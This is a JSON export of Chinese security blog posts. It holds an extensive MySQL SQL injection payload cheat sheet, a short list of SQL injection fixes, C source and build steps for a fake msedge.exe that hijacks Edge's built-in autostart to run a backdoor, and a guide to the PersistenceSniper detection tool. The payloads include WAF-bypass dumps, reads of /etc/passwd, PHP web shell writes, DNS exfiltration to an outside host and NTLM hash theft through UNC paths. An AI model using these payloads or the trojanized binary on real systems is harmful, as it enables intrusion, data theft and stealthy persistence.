{"posts":[{"title":"SQL 注入 - Mysql","content":"0x0 Mysql 基础语句 注释 # MYSQL 注释 -- 注释 [两个 - 后面加一个空格] /* MYSQL 注释 */ /*!32302 10*/ MYSQL 3.23.02 版本的注释 /*! MYSQL 特殊 SQL */ 查询语句 $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; $sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; $sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;; $sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username='$username' and users.password='$password' ORDER BY users.id DESC LIMIT 0,1&quot;; $sql = &quot;SELECT * FROM users ORDER BY $id&quot;; 插入语句 $sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;; 更新语句 $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;; 删除语句 $sql = &quot;delete from student where id = $id&quot; $sql = &quot;delete from student where id in ($id1, $id2, $id3)&quot; 0x1 基于 Union 的联合注入 一般用于查询语句的注入 检查列数 联合注入需要知道查询语句显示的列数，可以用以下方法去判断 order by 1' ORDER BY 1--+ #True 1' ORDER BY 2--+ #True 1' ORDER BY 3--+ #True 1' ORDER BY 4--+ #False - 可以判断，被注入语句查询结果有三列 -1' UNION SELECT 1,2,3--+ # True group by 1' GROUP BY 1--+ #True 1' GROUP BY 2--+ #True 1' GROUP BY 3--+ #True 1' GROUP BY 4--+ #False - 可以判断，被注入语句查询结果有三列 -1' UNION SELECT 1,2,3--+ # True 如果目标启用了错误显示 如果页面返回错误信息，可以构造语句让其显示语法错误，一般会显示需要的信息 order by 报错 1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # 如果提示：Unknown column '4' in 'order clause' # 说明第 4 列不存在，那么得知只有三列。 # -1' UNION SELECT 1,2,3--+ # True group by 报错 1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # 如果提示：Unknown column '4' in 'group statement' # 说明第 4 列不存在，那么得知只有三列。 # -1' UNION SELECT 1,2,3--+ # True union select 报错 1' UNION SELECT @--+ # 报错: The used SELECT statements have a different number of columns 1' UNION SELECT @,@--+ # 报错: The used SELECT statements have a different number of columns 1' UNION SELECT @,@,@--+ # 无报错，说明有 3 列 -1' UNION SELECT 1,2,3--+ # True limit into 1' LIMIT 1,1 INTO @--+ # 报错: The used SELECT statements have a different number of columns 1' LIMIT 1,1 INTO @,@--+ # 报错: The used SELECT statements have a different number of columns 1' LIMIT 1,1 INTO @,@,@--+ # 无报错，说明有 3 列 -1' UNION SELECT 1,2,3--+ # True select * from any_table 1' AND (SELECT * FROM Users) = 1--+ # (select * from users) 会返回 users 表的列数，通过逻辑判断 # 如果错误信息中包含：means query uses 3 column -1' UNION SELECT 1,2,3--+ # True 获取数据 有 information_schema 也可以 union all select，# 加上 all 可以显示所有结果，包括重复行。 # 数据库 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata # 表 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=... # 字段 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=... # 数据 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+... 无 information_schema 版本: Mysql &gt;= 4.1 # 首先获取字段数 ?id=(1)and(SELECT * from db.users)=(1) -- 报错：Operand should contain 4 column(s) # 然后提取字段 ?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1) -- 报错：Column 'id' cannot be null 版本 Mysql = 5 # 获取字段名 -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a -- #1060 - Duplicate column name 'id' -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a -- #1060 - Duplicate column name 'name' -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a ... 无字段名提取数据 获取第 4 列数据 select `4` from (select 1,2,3,4,5,6 union select * from users)dbname; 查询内注入 select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1); 基于错误回显的报错注入 报错信息长度有限 基本的报错 版本: Mysql &gt;= 4.1 (select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)) '+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+' UpdateXML 函数报错 AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)-- 短一点的 Payload ' and updatexml(null,concat(0x0a,version()),null)-- - ' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- - Extractvalue 函数报错 版本: Mysql &gt;= 5.1 ?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))-- NAME_CONST 函数报错 查询语句的内容必须是常量，也就是确定的值，无法使用通过 SQL 语句得到的值 版本 Mysql &gt;= 5.0 ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)-- ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)-- Mysql 布尔盲注 通过观察页面是否发生变化来判断 通过字符串比较 ?id=1 and substring(version(),1,1)=5 ?id=1 and right(left(version(),1),1)=5 ?id=1 and left(version(),1)=4 ?id=1 and ascii(lower(substr(Version(),1,1)))=51 ?id=1 and (select mid(version(),1,1)=4) ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A' ?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; 'A' order by &amp; 正则表达式 &amp; then [...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP &quot;^[BRUTEFORCE CHAR BY CHAR].*&quot; AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- - then &amp; 正则表达式 ' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP &quot;^a.*&quot;) THEN SLEEP(3) ELSE 1 END)); -- - # SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP &quot;^a.*&quot;) THEN SLEEP(3) ELSE 1 END)); -- -'; if 条件盲注 2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2 Response: # HTTP/1.1 500 Internal Server Error 2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2 Response: HTTP/1.1 200 OK make_set 盲注 AND MAKE_SET(YOLO&lt;(SELECT(length(version()))),1) AND MAKE_SET(YOLO&lt;ascii(substring(version(),POS,1)),1) AND MAKE_SET(YOLO&lt;(SELECT(length(concat(login,password)))),1) AND MAKE_SET(YOLO&lt;ascii(substring(concat(login,password),POS,1)),1) Like 盲注, '_' 匹配 SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l'; Mysql 时间盲注 在子查询中 sleep 1 and (select sleep(10) from dual where database() like '%')# 1 and (select sleep(10) from dual where database() like '___')# 1 and (select sleep(10) from dual where database() like '____')# 1 and (select sleep(10) from dual where database() like '_____')# 1 and (select sleep(10) from dual where database() like 'a____')# ... 1 and (select sleep(10) from dual where database() like 's____')# 1 and (select sleep(10) from dual where database() like 'sa___')# ... 1 and (select sleep(10) from dual where database() like 'sw___')# 1 and (select sleep(10) from dual where database() like 'swa__')# 1 and (select sleep(10) from dual where database() like 'swb__')# 1 and (select sleep(10) from dual where database() like 'swi__')# ... 1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')# 使用条件语句 ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))&gt;=100,1, BENCHMARK(2000000,MD5(NOW()))) -- ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))&gt;=100, 1, SLEEP(3)) -- ?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2 Mysql 一次性转储 (disposable dump) (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] &gt; ',table_name,' &gt; ',column_name,0x7C))))a)# (select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] &gt; ',column_data2,' &gt; ',0x7C))))a)# -- SecurityIdiots make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@) -- Profexer (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a) -- Dr.Z3r0 (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)) -- M@dBl00d (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)) -- Zen +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@) -- Zen WAF (/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a) -- ~tr0jAn WAF +concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+ -- ~tr0jAn Benchmark +concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name&gt;@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name&gt;@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name&gt;@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+ -- N1Z4M WAF +/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+ -- sharik (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a) Mysql 查看当前查询 union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST # -- Dump in one shot example for the table content. union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 # Mysql 读取文件内容 需要 file-priv，否则会有报错: ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement ' UNION ALL SELECT LOAD_FILE('/etc/passwd') -- UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php')); 如果已连接数据库，可以重新启用LOAD_FILE GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;# Mysql GetShell 输出 Shell 到文件 [...] UNION SELECT &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; into outfile &quot;C:\\\\xampp\\\\htdocs\\\\backdoor.php&quot; [...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '&lt;?php phpinfo();?&gt;' [...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- - [...] union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET['cmd']);?&gt;&quot;,6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php' Dump Shell 到文件 [...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php' [...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php'; Mysql 截断 主要与 sql-mode 的值有关 默认(非严格模式)：default， 非严格模式：&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot; 严格模式：：&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES&quot; 在非严格模式下，如果插入数据超过已设置长度，则会警告而不是报错。 select @@sql_mode # 查看数据库模式 `username` varchar(20) not null 利用：username = &quot;admin a&quot; 加入空格填充长度，使最后一个a被截断，则成功插入admin用户 Mysql 快速利用 使用 json_arrayagg 代替 group_concat，json_arrayagg 可以允许超过16000000个符号，group_concat 仅允许1024 个符号 版本 Mysql &gt;= 5.7.22 SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES; Use instead of which allows less symbols to be displayed * group_concat() = 1024 symbols * json_arrayagg() &gt; 16,000,000 symbolsjson_arrayagg()group_concat() UDF 命令执行 &amp; 提权 首先查看是否安装 UDF $ whereis lib_mysqludf_sys.so $ mysql -u root -p mysql Enter password: [...] mysql&gt; SELECT sys_eval('id'); +--------------------------------------------------+ | sys_eval('id') | +--------------------------------------------------+ | uid=118(mysql) gid=128(mysql) groups=128(mysql) | +--------------------------------------------------+ Mysql 消息外带 用于无回显的环境中 select @@version into outfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt'; select @@version into dumpfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt DNS 外带 select load_file(concat('\\\\\\\\',version(),'.hacker.site\\\\a.txt')); select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)) UNC 路径 - NTLM Hash 窃取 select load_file('\\\\\\\\error\\\\abc'); select load_file(0x5c5c5c5c6572726f725c5c616263); select 'osanda' into dumpfile '\\\\\\\\error\\\\abc'; select 'osanda' into outfile '\\\\\\\\error\\\\abc'; load data infile '\\\\\\\\error\\\\abc' into table database.table_name; ","link":"https://Zer0-hex.github.io/n3qKmqqFF/"},{"title":"SQL 注入修复措施","content":" 使用参数化查询：将输入值视为参数，而不是拼接到SQL查询中，可以有效地防止SQL注入攻击。使用参数化查询可以通过使用预定义的参数来向查询添加变量，这些变量会被正确地编码，从而避免了恶意输入注入的问题。 对输入进行有效的验证和过滤：通过对用户输入进行验证和过滤，可以确保输入符合预期的格式和类型，并且不包含恶意的代码。例如，可以使用正则表达式检查输入的格式，或者使用白名单机制来允许某些类型的输入。 最小化输入的特权：降低用户输入的权限可以帮助减少攻击的影响。例如，可以将用户输入限制为某些特定的字符或长度范围，或者只允许访问受限制的数据库对象。 使用ORM框架：ORM框架将对象映射到数据库中的关系表，从而减少了直接使用SQL查询的需要。ORM框架通常会自动进行参数化查询和编码，从而避免了SQL注入攻击的问题。 限制错误信息：不要在Web应用程序中向用户公开详细的错误信息。攻击者可以使用这些错误信息来发现漏洞和攻击点，并进一步利用它们进行攻击。应该通过使用自定义的错误消息来替代通用的错误消息，从而限制错误信息的公开。 定期更新数据库：在更新数据库之前，应该对新数据进行有效的验证和过滤，从而确保它们符合预期的格式和类型，并且不包含恶意的代码。 定期进行安全漏洞扫描和渗透测试，及时发现和修复潜在的安全漏洞。 采用最小权限原则，减少数据库用户的权限，从而限制攻击者对数据库的操作。 定期更新应用程序和数据库软件，及时修补安全漏洞，减少被攻击的风险。 在应用程序中使用加密传输技术，例如SSL/TLS，从而保护传输过程中的数据安全。 监控应用程序的访问日志，及时发现异常访问和操作，采取相应的安全措施。 ","link":"https://Zer0-hex.github.io/aAfFAptwJ/"},{"title":"利用 msedge.exe 自启动维权","content":" 在利用PersistenceSniper工具自动化查询恶意软件持久化操作时，发现 Windows10、Windows11 自带这个 Edge 预加载的自启动，因此可以利用一波。 流程大致如下 用 C 简单写一个 #pragma comment( linker, &quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot; ) // 隐藏控制台 #include&lt;string.h&gt; #include&lt;windows.h&gt; #define FILENAME &quot;msedge.exe&quot; #define DIR &quot;.\\\\*&quot; void backdoor(); char *get_msedge_path(char *dir); int main(int argc, char **argv) { if (argc &lt; 3 || strcmp(argv[1], &quot;--no-startup-window&quot;) || strcmp(argv[2], &quot;--win-session-start&quot;)) { char *msedgePath = NULL; msedgePath = get_msedge_path(DIR); system(msedgePath); } else { backdoor(); } return 0; } void backdoor() { // Input Your Code system(&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;); } char *get_msedge_path(char *dir) { int flag, length; char *dirName = NULL; WIN32_FIND_DATA p, pp; HANDLE h = FindFirstFile(dir, &amp;p); flag = 0; do { if (p.dwFileAttributes == 16) { dirName = p.cFileName; length = strlen(dirName); strcpy(dirName+length, &quot;\\\\*\\x00&quot;); HANDLE hh = FindFirstFile(dirName, &amp;pp); do { if (!strcmp(pp.cFileName, FILENAME)) { flag = 1; } } while(flag == 0 &amp;&amp; FindNextFile(hh,&amp;pp)); } } while(flag == 0 &amp;&amp; FindNextFile(h,&amp;p)); static char filePath[1024]; strcpy(filePath, &quot;start /b .\\\\&quot;); length = strlen(filePath); strcpy(filePath+length, dirName); length = strlen(filePath); strcpy(filePath+length-1, pp.cFileName); return filePath; } 编译测试 gcc msedge.c -o msedge.exe # 复制到 C:\\Program Files (x86)\\Microsoft\\Edge\\Application 目录下替换 # 运行测试 msedge.exe msedge.exe --no-startup-window --win-session-start /prefetch:5 添加图标 用 7z-zip 打开 msedge.exe 可以把里面的 ico 拿出来，版本号可能不一样，但都可以用。 源代码同目录创建一个 logo.rc 文件，内容如下 logo ICON &quot;logo.ico&quot; 把从 msedge.exe 里拿出来的 ico 文件一起放在同一个目录，并修改名称 msedge.c logo.rc logo.ico 编译 # 编译图标 windres.exe logo.rc logo.o # 编译 exe 删除信息并且最小化编译，关闭了栈保护 gcc -s -Os -fomit-frame-pointer -fno-stack-protector msedge.c logo.o -o msedge.exe 现在就很完美了 ","link":"https://Zer0-hex.github.io/JpFlp8CjR/"},{"title":"Windows 权限维持自动化检测工具","content":" PersistenceSniper 是一款针对 Windows 环境系统层面权限维持技术的自动化检测工具，适合应急响应时快速清除目标。 使用方法 开启 PS 执行权限 # 查看权限情况 PS C:\\&gt; Get-ExecutionPolicy -List Scope ExecutionPolicy ----- --------------- MachinePolicy Undefined UserPolicy Undefined Process Undefined CurrentUser Undefined LocalMachine Undefined # 修改权限为: RemoteSigned # 运行本地的脚本不需要数字签名，但是运行从网络上下载的脚本就必须要有数字签名； PS C:\\&gt; Set-ExecutionPolicy RemoteSigned # 搞完别忘了帮别人关掉 # 修改权限为: Undefined # 改为默认设置，一般用来删除执行权限 PS C:\\&gt; Set-ExecutionPolicy Undefined 加载脚本，启动 PS C:\\&gt; Import-Module .\\PersistenceSniper.psd1 # 加载 PS PS C:\\&gt; Get-Help -Name Find-AllPersistence -Full # 获取帮助, 没有中文 PS C:\\&gt; Find-AllPersistence # 无参数默认输出全部持久化程序 PS C:\\&gt; Find-AllPersistence -PersistenceMethod [TAB] # 输出单个持久化技术相关的程序，可以用 [TAB] 键补全 PS C:\\&gt; Find-AllPersistence | Out-GridView # GUI 的表进行交互，看上去舒服点 PS C:\\&gt; Find-AllPersistence -DiffCSV false_positives.csv # 输出到 CSV 文件，也可以与现有的 CSV 文件对比差异 PS C:\\&gt; Find-AllPersistence -PersistenceMethod RunAndRunOnce # 仅获取 Run 和 RunOnce 注册表项植入的持久化程序 PS C:\\&gt; Find-AllPersistence | Where-Object &quot;Access Gained&quot; -EQ &quot;System&quot; # 只查看以 NT AUTHORITY\\SYSTEM 权限运行的持久化程序 本地测试一波 PS C:\\&gt; Import-Module .\\PersistenceSniper.psd1 PS C:\\&gt; Find-AllPersistence Hostname : DESKTOP-UA6KPR1 Technique : Registry Run Key Classification : MITRE ATT&amp;CK T1547.001 Path : HKEY_USERS\\S-1-5-21-3069013648-1080194048-1350301826-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\R un\\MicrosoftEdgeAutoLaunch_BE49816B256B0FD155BC7BFC16CF6BDB Value : &quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&quot; --no-startup-window --win-session-start /prefetch:5 Access Gained : User Note : Executables in properties of the key (HKLM|HKEY_USERS\\&lt;SID&gt;)\\SOFTWARE\\Microsoft\\Windows\\CurrentVersio n\\Run are run when the user logs in. Reference : https://attack.mitre.org/techniques/T1547/001/ Signature : Status = Valid, Subject = CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US IsBuiltinBinary : False IsLolbin : False 这个 Edge 预加载是 Windows10、Windows11 自带的，当然不排除 EXE 被替换的可能。 ","link":"https://Zer0-hex.github.io/aEFrVllwS/"},{"title":"NNZ 一款模块化通用GUI界面","content":"NNZ 重保的告警数量还可以，写写工具，看看S12全球总决赛，慢慢长夜很快就过去了。 简介 